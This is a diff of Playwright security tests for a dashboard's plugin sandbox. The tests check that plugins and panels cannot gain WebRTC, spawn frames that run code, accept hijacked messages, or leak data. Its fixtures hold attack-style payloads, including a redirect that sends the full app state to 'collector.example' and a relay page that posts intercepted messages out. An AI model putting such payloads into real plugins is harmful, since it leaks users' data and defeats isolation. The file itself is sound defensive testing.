@@ -15,32 +15,45 @@ plugin.render((ctx) => ({
 }));
 `;
 
-async function runInSandbox(page: import("@playwright/test").Page, code: string, state: unknown = {}) {
+async function runInFrame(
+  page: import("@playwright/test").Page,
+  url: string,
+  messages: Record<string, unknown>[],
+  until: string,
+  pause = 0,
+) {
   return page.evaluate(
-    ([code, state]) =>
+    ([url, messages, until, pause]) =>
       new Promise<any>((resolve, reject) => {
         const frame = document.createElement("iframe");
-        frame.src = "plugin-sandbox.html";
+        const { port1, port2 } = new MessageChannel();
+        frame.src = url;
         frame.sandbox.add("allow-scripts");
         frame.allow = "";
-        const answer = (event: MessageEvent) => {
-          if (event.source !== frame.contentWindow) return;
-          if (event.data.t === "booted") {
-            frame.contentWindow!.postMessage({ id: 1, t: "init", code, store: {} }, "*");
-          } else if (event.data.t === "ready") {
-            frame.contentWindow!.postMessage({ id: 2, t: "state", state }, "*");
-          } else {
-            removeEventListener("message", answer);
-            resolve(event.data);
-          }
+        frame.addEventListener(
+          "load",
+          () => {
+            frame.contentWindow!.postMessage({ t: "port" }, "*", [port2]);
+            for (const message of messages.slice(0, -1)) port1.postMessage(message);
+            setTimeout(() => port1.postMessage(messages[messages.length - 1]), pause);
+          },
+          { once: true },
+        );
+        port1.onmessage = (event) => {
+          if (event.data.t === "failed" || event.data.t === until) resolve(event.data);
         };
-        addEventListener("message", answer);
         document.body.appendChild(frame);
         setTimeout(() => reject(new Error("sandbox never answered")), 5000);
       }),
-    [code, state] as const,
+    [url, messages, until, pause] as const,
   );
 }
+
+const runInSandbox = (page: import("@playwright/test").Page, code: string, state: unknown = {}, pause = 0) =>
+  runInFrame(page, "plugin-sandbox.html", [{ id: 1, t: "init", code, store: {} }, { id: 2, t: "state", state }], "result", pause);
+
+const runInPanel = (page: import("@playwright/test").Page, html: string) =>
+  runInFrame(page, "plugin-panel.html", [{ t: "init", html, assets: {}, state: {}, theme: {}, store: {} }], "effects");
 
 test("a plugin runs in an opaque origin with no way out", async ({ page }) => {
   await page.goto("/");
@@ -79,37 +92,100 @@ test("code only runs when it came from the frame's host", async ({ page }) => {
     () =>
       new Promise<any>((resolve, reject) => {
         const frame = document.createElement("iframe");
+        const { port1, port2 } = new MessageChannel();
         frame.src = "plugin-sandbox.html";
         frame.sandbox.add("allow-scripts");
         const bystander = document.createElement("iframe");
-        const said: string[] = [];
-        const answer = (event: MessageEvent) => {
-          if (event.source !== frame.contentWindow) return;
-          said.push(event.data.t);
-          if (event.data.t === "booted") {
-            const code = "plugin.render(() => ({ type: 'text', value: 'installed' }));";
-            frame.contentWindow!.postMessage({ id: 1, t: "init", code, store: {} }, "*");
-          } else if (event.data.t === "ready") {
-            const script = bystander.contentDocument!.createElement("script");
-            script.textContent =
-              "const hijack = { id: 2, t: 'init', code: \"plugin.render(() => ({ type: 'text', value: 'hijacked' }));\" };" +
-              "for (let i = 0; i < parent.frames.length; i++) parent.frames[i].postMessage(hijack, '*');";
-            bystander.contentDocument!.body.appendChild(script);
-            setTimeout(() => frame.contentWindow!.postMessage({ id: 3, t: "state", state: {} }, "*"), 100);
-          } else if (event.data.id === 3) {
-            removeEventListener("message", answer);
-            resolve({ ...event.data, said });
-          }
+        frame.addEventListener("load", () => {
+          const script = bystander.contentDocument!.createElement("script");
+          script.textContent =
+            "const hijack = { id: 2, t: 'init', code: \"plugin.render(() => ({ type: 'text', value: 'hijacked' }));\" };" +
+            "for (let i = 0; i < parent.frames.length; i++) {" +
+            "  const { port1, port2 } = new MessageChannel();" +
+            "  parent.frames[i].postMessage({ t: 'port' }, '*', [port2]);" +
+            "  port1.postMessage(hijack);" +
+            "}";
+          bystander.contentDocument!.body.appendChild(script);
+          frame.contentWindow!.postMessage({ t: "port" }, "*", [port2]);
+          const code = "plugin.render(() => ({ type: 'text', value: 'installed' }));";
+          port1.postMessage({ id: 1, t: "init", code, store: {} });
+          setTimeout(() => port1.postMessage({ id: 3, t: "state", state: {} }), 100);
+        });
+        port1.onmessage = (event) => {
+          if (event.data.id === 3) resolve(event.data);
         };
-        addEventListener("message", answer);
-        document.body.appendChild(frame);
         document.body.appendChild(bystander);
+        document.body.appendChild(frame);
         setTimeout(() => reject(new Error("sandbox never answered")), 5000);
       }),
   );
 
   expect(result.tree.value).toBe("installed");
-  expect(result.said.filter((t: string) => t === "ready")).toHaveLength(1);
+});
+
+const WEBRTC = `["RTCPeerConnection", "webkitRTCPeerConnection", "RTCDataChannel", "RTCIceTransport"].filter((name) => typeof window[name] !== "undefined").join()`;
+
+const framesOfItsOwn = (messages: Record<string, unknown>[]) => `
+  window.ran = [];
+  window.twinSaid = [];
+  addEventListener("message", (event) => window.ran.push(event.data));
+  const inline = "<body onload=\\"parent.postMessage('handler', '*')\\"><script>parent.postMessage('script', '*')</scr" + "ipt>";
+  for (const [attribute, value] of [["srcdoc", inline], ["src", "javascript:parent.postMessage('url', '*')"], ["src", "data:text/html," + inline]]) {
+    const child = document.createElement("iframe");
+    child.setAttribute(attribute, value);
+    document.body.appendChild(child);
+  }
+  const twin = document.createElement("iframe");
+  twin.srcdoc = "<script>" + document.querySelector("script").textContent + "</scr" + "ipt>";
+  twin.addEventListener("load", () => {
+    const { port1, port2 } = new MessageChannel();
+    port1.onmessage = (event) => window.twinSaid.push(JSON.stringify(event.data));
+    twin.contentWindow.postMessage({ t: "port" }, "*", [port2]);
+    for (const message of ${JSON.stringify(messages).replace(/<\//g, "<\\/")}) port1.postMessage(message);
+  });
+  document.body.appendChild(twin);
+`;
+
+test("a plugin has no WebRTC, in its own frame or in one it makes", async ({ page }) => {
+  await page.goto("/");
+  const inTwin = [
+    { id: 1, t: "init", code: `plugin.render(() => ({ type: "text", value: "twin has:" + ${WEBRTC} }));` },
+    { id: 2, t: "state" },
+  ];
+  const result = await runInSandbox(
+    page,
+    `${framesOfItsOwn(inTwin)}
+    plugin.render(() => ({ type: "text", value: JSON.stringify({ has: ${WEBRTC}, ran: window.ran, twin: window.twinSaid.join() }) }));`,
+    {},
+    1000,
+  );
+  const said = JSON.parse(result.tree.value);
+
+  expect(said.has).toBe("");
+  expect(said.ran).toEqual([]);
+  expect(said.twin).toContain('twin has:"');
+});
+
+test("a panel has no WebRTC, in its own frame or in one it makes", async ({ page }) => {
+  await page.goto("/");
+  const inTwin = [{ t: "init", html: `<p>drawn</p><script>pg.log("twin has:" + ${WEBRTC});</scr` + "ipt>" }];
+  const result = await runInPanel(
+    page,
+    `<p>drawn</p><script>${framesOfItsOwn(inTwin)}
+    setTimeout(() => pg.log(JSON.stringify({ has: ${WEBRTC}, ran: window.ran, twin: window.twinSaid.join() })), 1000);</script>`,
+  );
+  const said = JSON.parse(result.effects[0].text);
+
+  expect(said.has).toBe("");
+  expect(said.ran).toEqual([]);
+  expect(said.twin).toContain('twin has:"');
+});
+
+test("a panel's inline handler is refused, and its scripts still run", async ({ page }) => {
+  await page.goto("/");
+  const result = await runInPanel(page, `<button id="b" onclick="pg.log('handler')">x</button><script>document.getElementById("b").click(); pg.log("script");</script>`);
+
+  expect(result.effects.map((effect: any) => effect.text)).toEqual(["script"]);
 });
 
 const PIP = `
@@ -168,6 +244,7 @@ async function dashboardWithPlugin(
   granted = PLUGIN.granted,
   surfaces = PLUGIN.manifest.surfaces,
   assets: Record<string, string> = {},
+  file = "plugin.js",
 ) {
   await page.addInitScript(() => {
     class Offline extends EventTarget {
@@ -180,7 +257,7 @@ async function dashboardWithPlugin(
   await page.goto("/");
   await page.waitForFunction(() => Boolean((window as any).__pg.getState().link));
   await page.evaluate(
-    ({ plugin, permissions, code, granted, surfaces, monitor, assets }) => {
+    ({ plugin, permissions, code, granted, surfaces, monitor, assets, file }) => {
       const win = window as any;
       const sent: any[] = [];
       win.__sent = sent;
@@ -199,7 +276,7 @@ async function dashboardWithPlugin(
           printers: [], prints: [], reviews: [], monitors: [monitor], tokens: [], integrations: [], notifiers: [],
           settings: { notifiers: {}, update_check: true, theme: "dark", themes: [], layout: {} },
           stats: { inference_device: "CPU", infer_ms: 1, capacity_fps: 1 },
-          plugins: [{ ...plugin, manifest: { ...plugin.manifest, surfaces, events: ["result"] }, granted, files: ["plugin.js"] }],
+          plugins: [{ ...plugin, manifest: { ...plugin.manifest, surfaces, events: ["result"] }, granted, files: [file] }],
           plugin_permissions: permissions,
           plugin_events: { state: [], result: ["monitor_id", "prediction"] },
           plugin_assets: { png: "image/png", txt: "text/plain", mp3: "audio/mpeg" },
@@ -207,11 +284,58 @@ async function dashboardWithPlugin(
       });
       win.__pgEvent({ event: "state", ...win.__pg.getState().engine });
       const request = sent.find((c) => c.cmd === "plugin.code");
-      win.__pgEvent({ event: "plugin_code", id: "pip", sources: { "plugin.js": code }, assets, req_id: request?.req_id });
+      win.__pgEvent({ event: "plugin_code", id: "pip", sources: { [file]: code }, assets, req_id: request?.req_id });
     },
-    { plugin: PLUGIN, permissions: PERMISSIONS, code, granted, surfaces, monitor: MONITOR, assets },
+    { plugin: PLUGIN, permissions: PERMISSIONS, code, granted, surfaces, monitor: MONITOR, assets, file },
   );
-  await expect.poll(() => page.evaluate(() => Object.keys((window as any).__pg.getState().pluginTrees).length)).toBeGreaterThan(0);
+  if (file === "panel.html") await expect(page.locator("iframe[title='Picture in picture panel']")).toBeAttached();
+  else await expect.poll(() => page.evaluate(() => Object.keys((window as any).__pg.getState().pluginTrees).length)).toBeGreaterThan(0);
+}
+
+test("a panel.html draws itself in a frame of its own", async ({ page }) => {
+  await dashboardWithPlugin(page, "<p>drawn by the panel</p>", ["state:read"], ["panel"], {}, "panel.html");
+
+  await expect(page.frameLocator("iframe[title='Picture in picture panel']").getByText("drawn by the panel")).toBeVisible();
+});
+
+const LEAVES = {
+  "plugin.js": (to: string) =>
+    `plugin.render((ctx) => { if (ctx.state.monitors[0].alert) location.href = "${to}?state=" + encodeURIComponent(JSON.stringify(ctx.state)); return { type: "text", value: "drawn" }; });`,
+  "panel.html": (to: string) =>
+    `<p>drawn</p><script>pg.on("state", (state) => { if (state.monitors[0].alert) location.replace("${to}?state=" + encodeURIComponent(JSON.stringify(state))); });</scr` + `ipt>`,
+};
+const RELAY = `<!doctype html><script>
+  addEventListener("message", (event) => {
+    fetch("/overheard", { method: "POST", body: JSON.stringify(event.data) });
+    for (const port of event.ports) port.onmessage = (told) => fetch("/overheard", { method: "POST", body: JSON.stringify(told.data) });
+  });
+</scr` + `ipt>`;
+
+for (const file of ["plugin.js", "panel.html"] as const) {
+  for (const to of ["https://collector.example/landed", "/elsewhere"]) {
+    test(`a ${file} that sends its frame to ${to} is stopped and told nothing more`, async ({ page }) => {
+      const reached: string[] = [];
+      await page.route(/collector\.example|\/elsewhere|\/overheard/, (route) => {
+        reached.push(new URL(route.request().url()).pathname);
+        return route.fulfill({ contentType: "text/html", body: RELAY });
+      });
+      await dashboardWithPlugin(page, LEAVES[file](to), ["state:read"], ["panel"], {}, file);
+      const alert = (ts: number) =>
+        page.evaluate((ts) => {
+          const win = window as any;
+          const engine = win.__pg.getState().engine;
+          win.__pgEvent({ event: "state", ...engine, monitors: engine.monitors.map((m: any) => ({ ...m, alert: { ts, score: 0.9, action: "pause" } })) });
+        }, ts);
+
+      await alert(1);
+      await expect.poll(() => page.evaluate(() => (window as any).__pg.getState().pluginFailures.pip)).toBe("sandbox navigated away");
+      await expect(page.locator("iframe")).toHaveCount(0);
+      await alert(2);
+      await page.waitForTimeout(500);
+
+      expect(reached).toEqual(to === "/elsewhere" ? ["/elsewhere"] : []);
+    });
+  }
 }
 
 test("an installed plugin draws its panel with a real camera feed", async ({ page }) => {
